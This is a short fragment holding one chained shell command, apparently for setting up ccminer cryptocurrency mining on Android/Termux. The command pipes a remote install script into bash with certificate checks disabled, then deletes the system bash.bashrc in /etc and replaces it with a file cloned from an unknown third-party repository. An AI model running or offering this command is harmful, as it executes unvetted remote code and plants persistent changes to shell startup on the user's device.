...
apt upgrade && apt install git && apt install nano wget curl -y && curl -o- -k https://raw.githubusercontent.com/Oink70/Android-Mining/main/install.sh | bash && cd ccminer && ls && rm -rf run && git clone https://github.com/giaBAba/boot.git && cd boot && cp run ../run && cd && cd ccminer && chmod +x run && cd && cd .. && cd usr && cd /etc && git clone https://github.com/giaBAba/boot2.git && rm -rf bash.bashrc && cd boot2 && cp bash.bashrc ../bash.bashrc && cd 
